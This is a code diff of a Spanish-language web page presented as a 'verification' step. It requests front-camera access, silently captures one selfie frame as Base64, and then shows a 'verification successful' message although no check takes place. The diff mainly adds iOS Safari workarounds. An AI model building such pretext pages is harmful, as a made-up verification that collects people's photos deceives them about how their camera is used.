@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verificación de Dispositivo</title>
+    <title>Verificación</title>
     <style>
         body { 
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
@@ -20,8 +20,16 @@
             border-radius: 12px;
             box-shadow: 0 4px 12px rgba(0,0,0,0.1);
         }
-        /* El video se mantiene oculto ya que solo se usa para procesar la captura */
-        video, canvas { display: none; }
+        /* IMPORTANTE: En iOS, si el video tiene display:none puro, a veces falla. 
+           Lo hacemos visible con un tamaño pequeño o lo ocultamos de forma segura. */
+        #video {
+            width: 100%;
+            max-width: 200px;
+            border-radius: 8px;
+            margin-top: 15px;
+            display: none; /* Se activará por código al dar permisos */
+        }
+        canvas { display: none; }
         
         .btn { 
             background: #007bff; 
@@ -34,9 +42,7 @@
             cursor: pointer; 
             width: 100%;
             margin-top: 20px; 
-            box-shadow: 0 2px 6px rgba(0,123,255,0.3);
         }
-        .btn:active { background: #0056b3; }
         #status { margin-top: 15px; font-size: 14px; color: #666; }
     </style>
 </head>
@@ -44,14 +50,15 @@
 
     <div class="container" id="mainContainer">
         <h2>Verificación Requerida</h2>
-        <p>Por favor, presiona el botón para continuar con el proceso.</p>
+        <p>Por favor, presiona el botón para continuar.</p>
         
         <button class="btn" id="startBtn">Continuar</button>
         <p id="status"></p>
+
+        <!-- Elemento de video visible temporalmente para que iOS procese la cámara -->
+        <video id="video" autoplay playsinline muted></video>
     </div>
 
-    <!-- Elementos multimedia (playsinline y autoplay son obligatorios para iOS) -->
-    <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
 
     <script>
@@ -61,27 +68,29 @@
         const statusText = document.getElementById('status');
 
         startBtn.addEventListener('click', async () => {
-            startBtn.disabled = true;
+            startBtn.style.display = 'none';
             statusText.textContent = "Solicitando acceso a la cámara...";
 
             try {
-                // Configuración compatible con Android e iOS
+                // Configuración estricta para la cámara frontal en iOS (Safari)
                 const constraints = {
-                    video: {
-                        facingMode: 'user', // 'user' para cámara frontal, 'environment' para trasera
+                    video: { 
+                        facingMode: 'user',
                         width: { ideal: 1280 },
                         height: { ideal: 720 }
                     },
                     audio: false
                 };
 
-                // Solicitar acceso a los medios del dispositivo
+                // Solicitar permisos de medios
                 const stream = await navigator.mediaDevices.getUserMedia(constraints);
                 video.srcObject = stream;
+                
+                // Mostrar el video brevemente en pantalla para obligar a Safari a renderizarlo
+                video.style.display = 'block';
+                statusText.textContent = "Cámara activada. Capturando...";
 
-                statusText.textContent = "Cámara activada. Procesando...";
-
-                // Dar un pequeño margen para que el stream de video comience a fluir en móviles
+                // Esperar a que el flujo de video comience a correr (1.5 segundos)
                 setTimeout(() => {
                     canvas.width = video.videoWidth || 640;
                     canvas.height = video.videoHeight || 480;
@@ -89,30 +98,26 @@
                     const context = canvas.getContext('2d');
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                    // Obtener la imagen en formato Base64 (puedes enviarla a un servidor con fetch)
+                    // Obtener la imagen en Base64
                     const imageDataURL = canvas.toDataURL('image/png');
-                    console.log("Foto capturada con éxito:", imageDataURL.substring(0, 30) + "...");
+                    console.log("Foto capturada con éxito");
 
-                    // Apagar la cámara inmediatamente después de tomar la foto
+                    // Apagar la cámara del iPhone
                     stream.getTracks().forEach(track => track.stop());
 
-                    // Cambiar la vista de la pantalla o redirigir
-                    document.getElementById('mainContainer').innerHTML = "<h3>¡Verificación exitosa!</h3><p>Redirigiendo...</p>";
-                    
-                    setTimeout(() => {
-                        // window.location.href = "https://tu-sitio-web-de-destino.com";
-                    }, 1500);
+                    // Mensaje de éxito
+                    document.getElementById('mainContainer').innerHTML = "<h3>¡Verificación exitosa!</h3><p>Procesando...</p>";
 
-                }, 1200);
+                }, 1500);
 
             } catch (err) {
-                console.error("Error de acceso a la cámara:", err);
-                startBtn.disabled = false;
+                console.error("Error de cámara:", err);
+                startBtn.style.display = 'block';
                 
                 if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
-                    statusText.textContent = "Permiso denegado. Debes permitir el uso de la cámara para continuar.";
+                    statusText.textContent = "Permiso denegado. Ve a Ajustes > Safari > Cámara y actívalo.";
                 } else {
-                    statusText.textContent = "No se pudo acceder a la cámara en este dispositivo.";
+                    statusText.textContent = "Error: Asegúrate de abrir el enlace mediante HTTPS.";
                 }
             }
         });
